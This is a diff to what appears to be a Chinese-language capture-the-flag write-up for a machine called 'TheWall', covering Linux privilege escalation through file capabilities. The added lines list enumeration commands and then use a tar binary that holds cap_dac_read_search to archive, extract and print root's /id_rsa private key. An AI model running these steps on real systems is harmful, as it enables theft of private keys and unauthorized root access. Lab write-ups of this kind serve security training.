@@ -153,6 +153,7 @@ cc5db5e7b0a26e807765f47a006f6221
 ```c
 Files with capabilities (limited to 50):
 /usr/sbin/tar cap_dac_read_search=ep
+/usr/bin/ping cap_net_raw=ep
 ```
 
 系统根目录下有一个属于**root的****id_rsa文件**
@@ -164,3 +165,21 @@ john@TheWall:~$ ls -lah /
 - 读取系统上的任何文件，无论其权限如何。
 
 - 搜索（列出内容）系统上的任何目录，无论其权限如何。
+
+
+搜索属于用户组的文件
+```c
+find / -xdev -group 1000 2>/dev/null
+```
+
+搜索具有修改功能的文件
+```c
+/sbin/getcap -r / 2>/dev/null
+```
+
+```c
+john@TheWall:~$ /usr/sbin/tar cf id_rsa.tar /id_rsa
+
+john@TheWall:~$ tar xf id_rsa.tar 
+john@TheWall:~$ cat id_rsa
+```
